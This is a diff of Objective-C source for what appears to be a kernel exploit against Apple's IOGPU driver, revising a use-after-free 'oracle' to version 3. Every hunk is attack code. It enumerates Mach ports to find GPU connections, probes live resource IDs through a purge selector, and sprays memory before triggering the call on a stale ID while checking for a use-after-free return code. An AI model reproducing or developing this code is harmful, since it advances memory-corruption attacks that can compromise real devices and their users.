@@ -21,7 +21,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P065_BUILD @"p065-facet-a-oracle-v2"
+#define P065_BUILD @"p065-facet-a-oracle-v3"
 #define P065_SEL_PURGE 3
 #define P065_UAF_KR ((kern_return_t)0xe00002be)
 #define P065_SPRAY_N 0x300
@@ -136,7 +136,7 @@ static NSArray<NSNumber *> *p065_conns(id<MTLDevice> dev) {
 
     mach_port_t explicitConn = p065_open_iogpu_explicit();
     if (explicitConn) {
-        kern_return_t kr = g_trap2((io_connect_t)explicitConn, P065_SEL_PURGE, 1, 0);
+        kern_return_t kr = g_trap2((io_connect_t)explicitConn, P065_SEL_PURGE, 1, 1);
         p065_add_port(conns, seen, explicitConn, kr, @"IOGPUDeviceCreate");
     }
 
@@ -152,7 +152,7 @@ static NSArray<NSNumber *> *p065_conns(id<MTLDevice> dev) {
         if (!(types[i] & MACH_PORT_TYPE_SEND)) continue;
         mach_port_name_t p = names[i];
         if (p < 0x100 || p > 0x40000) continue;
-        kern_return_t kr = g_trap2((io_connect_t)p, P065_SEL_PURGE, 1, 0);
+        kern_return_t kr = g_trap2((io_connect_t)p, P065_SEL_PURGE, 1, 1);
         if (p065_trap2_reject(kr)) continue;
         p065_add_port(conns, seen, p, kr, @"port-scan");
     }
@@ -165,7 +165,7 @@ static NSArray<NSNumber *> *p065_conns(id<MTLDevice> dev) {
 static NSMutableSet<NSNumber *> *p065_liveIds(io_connect_t conn) {
     NSMutableSet *set = [NSMutableSet set];
     for (uint32_t i = 1; i <= 255; i++) {
-        kern_return_t kr = g_trap2(conn, P065_SEL_PURGE, i, 0);
+        kern_return_t kr = g_trap2(conn, P065_SEL_PURGE, i, 1);
         if (kr != (kern_return_t)0xe00002c2) [set addObject:@(i)];
     }
     return set;
@@ -311,8 +311,8 @@ static id<MTLTexture> p065_tex(id<MTLDevice> dev, uint32_t w, uint32_t h) {
         }
         p065_log(@"spray %u x 0x100 zeros (Call2/Call3 skipped)", (unsigned)spray.count);
 
-        kern_return_t kr = g_trap2(conn, P065_SEL_PURGE, stale, 0);
-        kern_return_t krC = g_trap2(conn, P065_SEL_PURGE, censusId, 0);
+        kern_return_t kr = g_trap2(conn, P065_SEL_PURGE, stale, 5);
+        kern_return_t krC = g_trap2(conn, P065_SEL_PURGE, censusId, 1);
         p065_log(@"sel3 stale id=%u kr=0x%x control id=%u kr=0x%x",
                  (unsigned)stale, (unsigned)kr, (unsigned)censusId, (unsigned)krC);
         if (kr == P065_UAF_KR) {
